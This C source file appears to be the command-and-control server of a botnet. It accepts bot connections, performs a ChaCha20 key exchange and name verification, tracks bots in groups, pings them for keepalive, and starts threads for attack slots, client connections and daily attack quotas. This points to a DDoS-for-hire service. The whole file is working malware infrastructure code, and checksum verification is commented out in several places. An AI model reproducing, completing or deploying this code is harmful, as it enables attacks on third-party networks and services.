#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <string.h>
#include <sys/epoll.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#include "debug.h"
#include "util.h"
#include "bool.h"
#include "csum.h"
#include "db.h"
#include "main.h"

#include "slots.h"
#include "attack.h"
#include "rand.h"
#include "listener.h"
#include "bot.h"
#include "groups.h"
#include "client.h"

#include "chacha20.h"

void bot_accept_client(int epfd, listener_t *listener) {

	while (TRUE) {
		int botfd = accept(listener->fd, NULL, NULL);

		if (botfd <= 0)
			break;

		PRINTF("Client connection: FD%d\n", botfd);

		NONBLOCK(botfd);

		epoll_mod(epfd, EPOLL_CTL_ADD, botfd, EPOLLIN | EPOLLRDHUP | EPOLLHUP);
		bot_setup(botfd, listener->port);
	}
}

void bot_disconnect_client(bot_t *bot, int fd, uint8_t reason) {
	if (ATOMIC_GET(&bot->connected)) {
		switch (reason) {
			case PING_TIMEOUT:
				printf("Bot [FD%d] -> ['%s'] disconnected due to ping timeout\n", bot->fd, bot->name);
				break;
			case EXCHANGE_FAIL:
				printf("Bot [FD%d] -> ['%s'] disconnected due to exchange fail\n", bot->fd, bot->name);
				break;
			case BOT_DISCONNECT:
				printf("Bot [FD%d] -> ['%s'] disconnected\n", bot->fd, bot->name);
				break;
			case PROTOCOL_FAIL:
				printf("Bot [FD%d] -> ['%s'] disconnected due to protocol mismatch\n", bot->fd, bot->name);
				break;
			default:
				printf("Bot [FD%d] -> ['%s'] disconnected due to unknown reason\n", bot->fd, bot->name);
				break;			
		}
	}

	close(fd);

	bot_dec_group(bot->name);
	memset(bot, 0, sizeof(bot_t));
}

void bot_handle_key_handover(int epfd, bot_t *bot) {	
	int n = recv(bot->fd, &bot->hdr, HDR_PKT_LEN, MSG_NOSIGNAL);

	if (n <= 0)
		return bot_disconnect_client(bot, bot->fd, EXCHANGE_FAIL);

	PRINTF("FD%d handling key handover\n", bot->fd);

	if (!bot_check_hdr_len(bot, n)) {
		return bot_disconnect_client(bot, bot->fd, EXCHANGE_FAIL);
	}

	/*
	if (!csum_verify(&bot->hdr, bot->hdr.csum)) {
		puts("csum fail");
		return bot_disconnect_client(bot, EXCHANGE_FAIL);
	}
	*/

	if (bot->hdr.op != HANDOVER) {
		return bot_disconnect_client(bot, bot->fd, EXCHANGE_FAIL);
	}

	bot_generate_key(bot);

	csum_handover_key(bot);
	csum_handover_nonce(bot);

	bot->state = VERIFY_EXCHANGE;
}

void bot_handle_verification(int epfd, bot_t *bot) {
	int n = recv(bot->fd, &bot->hdr, HDR_PKT_LEN, MSG_NOSIGNAL);

	if (n <= 0)
		return bot_disconnect_client(bot, bot->fd, EXCHANGE_FAIL);

	PRINTF("FD%d handling bot verification\n", bot->fd);

	chacha20_xor(bot->key, 1, bot->nonce, (uint8_t *)&bot->hdr, (uint8_t *)&bot->hdr, n);

	if (!bot_check_hdr_len(bot, n))
		return bot_disconnect_client(bot, bot->fd, EXCHANGE_FAIL);

	/*
	if (!csum_verify(&bot->hdr, bot->hdr.csum))
		return bot_disconnect_client(bot, EXCHANGE_FAIL);
	*/

	if (bot->hdr.op != VERIFY)
		return bot_disconnect_client(bot, bot->fd, EXCHANGE_FAIL);

	bot->state = VERIFY_NAME;
	bot->expected = ntohs(bot->hdr.len);
}

int bot_receive_data(int epfd, bot_t *bot) {

	int rcved = 0;

	while (rcved != bot->expected) {
		int n = recv(bot->fd, bot->rdbuf + rcved, bot->expected - rcved, MSG_NOSIGNAL);

		if (n <= 0) {
			bot_disconnect_client(bot, bot->fd, PROTOCOL_FAIL);
			return -1;
		}

		rcved += n;
	}

	bot->expected = 0;

	return rcved;
}

void bot_handle_name_verification(int epfd, bot_t *bot) {
	int len = bot_receive_data(epfd, bot);

	PRINTF("FD%d handling name verification\n", bot->fd);

	if (len <= 0)
		return bot_disconnect_client(bot, bot->fd, BOT_DISCONNECT);

	chacha20_xor(bot->key, 1, bot->nonce, bot->rdbuf, bot->rdbuf, len);
	strncpy(bot->name, bot->rdbuf, len);

	if (!is_valid_name(bot->name)) {
		return bot_disconnect_client(bot, bot->fd, BOT_DISCONNECT);
	}

	printf("Bot [FD%d] [PORT:%d]-> ['%s'] verified connection\n", bot->fd, bot->bot_port, bot->name);
	bot_inc_group(bot->name);

	bot_set_connected(bot);
	bot->state = CONNECTED;
}

void bot_handle_verify_exchange(int epfd, bot_t *bot) {
	int n = recv(bot->fd, &bot->hdr, HDR_PKT_LEN, MSG_NOSIGNAL);

	PRINTF("FD%d handling verify exchange\n", bot->fd);

	chacha20_xor(bot->key, 1, bot->nonce, (uint8_t *)&bot->hdr, (uint8_t *)&bot->hdr, n);

	if (!bot_check_hdr_len(bot, n))
		return bot_disconnect_client(bot, bot->fd, EXCHANGE_FAIL);

	/*
	if (csum_verify(&bot->hdr, bot->hdr.csum)) {
		csum_confirm_exchange(bot);
		bot->state = VERIFYING;
	}
	else {
		return bot_disconnect_client(bot, EXCHANGE_FAIL);
	}
	*/

	if (bot->hdr.op == CONFIRM_EXCHANGE) {
		csum_confirm_exchange(bot);
		bot->state = VERIFYING;
	}
	else {
		return bot_disconnect_client(bot, bot->fd, EXCHANGE_FAIL);
	}
}

void bot_set_timeout(bot_t *bot) {
#ifdef DEBUG
	printf("Bot FD%d '%s' sent keepalive packet\n", bot->fd, bot->name);
#endif
	bot_update_timeout(bot);
}

void bot_unknown_op(bot_t *bot) {
	printf("Bot [FD%d] -> ['%s'] sent unknown opcode '0x%02x'\n", bot->fd, bot->name, bot->hdr.op);
	bot_disconnect_client(bot, bot->fd, PROTOCOL_FAIL);
}

void bot_handle_event(int epfd, bot_t *bot) {
	int n = recv(bot->fd, &bot->hdr, HDR_PKT_LEN, MSG_NOSIGNAL);

	PRINTF("FD%d handling event\n", bot->fd);

	chacha20_xor(bot->key, 1, bot->nonce, (uint8_t *)&bot->hdr, (uint8_t *)&bot->hdr, n);

	if (!bot_check_hdr_len(bot, n))
		return bot_disconnect_client(bot, bot->fd, EXCHANGE_FAIL);

	/*
	if (!csum_verify(&bot->hdr, bot->hdr.csum))
		return bot_disconnect_client(bot, EXCHANGE_FAIL);
	*/

	switch (bot->hdr.op) {

	case PONG:
		return bot_set_timeout(bot);
	default:
		return bot_unknown_op(bot);
	}
}

void bot_handle_client(int epfd, int botfd) {

	bot_t *bot = bot_get(botfd);

	/* In theory this could never go wrong but.. */
	if (!bot)
		return;

	switch (bot->state) {
	case KEY_HANDOVER:
		return bot_handle_key_handover(epfd, bot);
	case VERIFY_EXCHANGE:
		return bot_handle_verify_exchange(epfd, bot);
	case VERIFYING:
		return bot_handle_verification(epfd, bot);
	case VERIFY_NAME:
		return bot_handle_name_verification(epfd, bot);
	case CONNECTED:
		return bot_handle_event(epfd, bot);
	}
}

void bot_handle_states(void) {
	int epfd = epoll_create1(0);

	/* init listeners */
	listener_init(epfd);

	rand_init();

	struct epoll_event *evs = calloc(BOT_MAX_CLIENTS, sizeof(struct epoll_event));

	while (TRUE) {
		int n = epoll_wait(epfd, evs, BOT_MAX_CLIENTS, -1);

		for (int i = 0; i < n; i++) {
			struct epoll_event *ev = &evs[i];

			if (ev->events & EPOLLRDHUP || ev->events & EPOLLHUP || ev->events & EPOLLERR) {
				bot_disconnect_client(bot_get(ev->data.fd), ev->data.fd, BOT_DISCONNECT);
			}

			else if (ev->events & EPOLLIN) {
				if (((int *)&ev->data)[1] != 0) {
					listener_t *listener = (listener_t *)ev->data.ptr;
					bot_accept_client(epfd, listener);
				}
				else {
					bot_handle_client(epfd, ev->data.fd);
				}
			}
			else {
				PRINTF("FD%d sent events %x\n", ev->data.fd, ev->events);
				bot_disconnect_client(bot_get(ev->data.fd), ev->data.fd, BOT_DISCONNECT);
			}
		}
	}
}

void *bot_handle_keepalive(void *varg) {

	csum_t hdr = {0};

	while (TRUE) {
		int hdr_len = csum_create(&hdr, PING, 0);

		for (int i = 0; i < BOT_MAX_CLIENTS; i++) {
			bot_t *bot = bot_get(i);

			if (!ATOMIC_GET(&bot->connected))
				continue;

			if (time(0) >= bot->ping_timestamp + bot->next_ping) {
				bot->ping_timestamp = time(0);
				bot->next_ping = rand_next_range(BOT_PING_MIN, BOT_PING_MAX);

				send(bot->fd, &hdr, hdr_len, MSG_NOSIGNAL);
			}
		}

		sleep(20);

		BOOL empty_attack_slots = attack_slot_is_empty();

		for (int i = 0; i < BOT_MAX_CLIENTS; i++) {
			bot_t *bot = bot_get(i);

			if (!ATOMIC_GET(&bot->connected))
				continue;

			if (!empty_attack_slots) {
				bot_update_timeout(bot);
				continue;
			}

			if (time(0) >= ATOMIC_GET(&bot->resp_timestamp) + BOT_MAX_TIMEOUT) {
				bot_disconnect_client(bot, bot->fd, PING_TIMEOUT);
			}
		}
	}
}

int main(int argc, char **args) {
	/* init database */
	database_open();

	/* run all threads */
	pthread_create(&(pthread_t){0}, NULL, attack_slot_handler, NULL);
	pthread_create(&(pthread_t){0}, NULL, bot_handle_keepalive, NULL);
	pthread_create(&(pthread_t){0}, NULL, client_connection_handler, NULL);

	/* attack refreshers */
	pthread_create(&(pthread_t){0}, NULL, update_daily_client_attacks, NULL);

	bot_handle_states();

	return 0;
}
